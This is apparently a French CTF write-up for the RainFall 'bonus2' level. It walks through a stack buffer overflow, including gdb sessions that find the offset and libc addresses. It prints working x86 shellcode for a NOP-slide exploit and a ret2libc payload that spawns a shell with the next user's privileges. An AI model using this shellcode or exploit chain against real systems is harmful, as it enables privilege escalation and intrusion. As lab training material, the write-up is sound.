# Bonus 2

Nous realisons un autre NOP Slide apres apres trouver l'offset et une adresse proche du segfault pour le nop slide que nous mettons sur l'offset
```
bonus2@RainFall:~$ env -i LANG="nl" SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'` ./bonus2 `python -c 'print "A" * 40'` `python -c 'print "A" * 23 + "\xbc\xff\xff\xbf"'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ id
\uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
```

Pendant qu'on essayait de trouver notre offset, on remarquer que le programme segfaultait à des endroits differents en fonction de la variable d'env `LANG`
```
echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz" > /tmp/garbage
$ gdb ./bonus2
(gdb) r `cat /tmp/garbage` `cat /tmp/garbage`
Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x08004848 in ?? ()
(gdb) set env LANG=fi
(gdb) r `cat /tmp/garbage` `cat /tmp/garbage`
Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()

```
À partir de la, on peut déterminer l'offset et l'utiliser pour faire un NOP Slide ou un ret2libc.</br>
```
$ node
> (0x45-"A".charCodeAt(0))*4
16
```
Notre offset est donc de 16 (+ 2 pour pouvoir décaller l'adresse du segfault à 0x45454545).

On pourrait refaire un NOP Slide et mettre un shellcode dans l'env mais cette fois ci, on va faire un `ret2libc`.</br>
En premier lieu, on va chercher les adresses des fonctions `system` et `exit` dans la libc.</br>
Ensuite, on va chercher l'adresse de `/bin/sh` dans la libc, on pourrait aussi la prendre dans les varaible d'env.</br>
```
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r
Starting program: /home/user/bonus2/bonus2

Breakpoint 1, 0x0804852f in main ()
(gdb) info proc map
process 4608
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
...
	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
...
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) info function system
All functions matching regular expression "system":
0xb7e6b060  system
(gdb) info function exit
All functions matching regular expression "exit":
0xb7e5ebe0  exit
```
Maintenant qu'on a toutes les adresses, il ne nous reste plus qu'a faire notre exploit.

Padding de "A" + adresse de `system` + adresse de `exit` + adresse de `/bin/sh`
```
$ LANG=fi ./bonus2 `python -c 'print "A"*100'` `python -c 'print "A"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"'`
$ whoami
bonus3
$ cat ~bonus3/.pass
```
